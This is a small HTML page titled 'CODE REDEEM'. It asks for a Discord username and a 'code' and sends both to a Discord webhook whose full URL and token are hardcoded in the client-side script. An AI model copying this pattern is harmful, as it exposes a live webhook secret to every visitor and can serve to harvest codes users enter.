<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CODE REDEEM</title>
</head>
<body>
    <h1>CODE REDEEM</h1>
    <label for="discordInput">Discord Username:</label>
    <input type="text" id="discordInput" placeholder="Enter Discord Username">
    <br>
    <label for="codeInput">Code:</label>
    <textarea id="codeInput" rows="4" cols="50" placeholder="Enter your code"></textarea>
    <br>
    <button id="sendButton">Send to Discord</button>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const sendButton = document.getElementById("sendButton");
            sendButton.addEventListener("click", sendData);

            function sendData() {
                const discordInput = document.getElementById("discordInput").value;
                const codeInput = document.getElementById("codeInput").value;

                if (discordInput && codeInput) {
                    const webhookUrl = "https://discord.com/api/webhooks/1144580952039890975/k69uOT3MaVrA-3N5pjWPKOzrtlSglASvxHPPuiAFF9S8RoYTXhwtYDCxJLedNsKtV9WP";
                    const requestData = {
                        content: `Discord User: ${discordInput}\nCode: ${codeInput}`
                    };

                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(requestData)
                    })
                    .then(response => {
                        if (response.ok) {
                            alert("Data sent to Discord!");
                        } else {
                            alert("Failed to send data to Discord.");
                        }
                    })
                    .catch(error => {
                        alert("An error occurred: " + error);
                    });
                } else {
                    alert("Please fill in both Discord Username and code.");
                }
            }
        });
    </script>
</body>
</html>
